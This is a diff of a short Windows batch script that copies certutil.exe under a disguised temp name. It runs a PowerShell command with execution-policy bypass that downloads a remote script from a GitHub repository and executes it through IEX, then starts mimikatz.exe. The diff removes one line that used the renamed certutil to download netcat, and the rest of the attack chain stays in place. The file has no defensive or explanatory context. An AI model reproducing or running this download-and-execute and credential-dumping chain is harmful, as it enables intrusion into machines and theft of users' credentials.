@@ -1,7 +1,7 @@
 @echo on
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
+
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 start %temp%\mimikatz.exe
 
